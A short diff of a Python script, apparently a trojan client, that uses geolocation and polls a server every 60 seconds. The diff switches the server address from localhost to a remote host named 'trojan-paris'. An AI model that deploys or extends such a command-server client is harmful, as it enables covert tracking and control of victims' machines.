@@ -18,7 +18,7 @@ import geocoder  # Pour une géolocalisation améliorée
 logging.basicConfig(level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')
 
 # URL du serveur
-SERVER_URL = "http://127.0.0.1:5000"
+SERVER_URL = "https://trojan-paris.up.railway.app"
 CHECK_INTERVAL = 60  # en secondes
 
 ##########################################
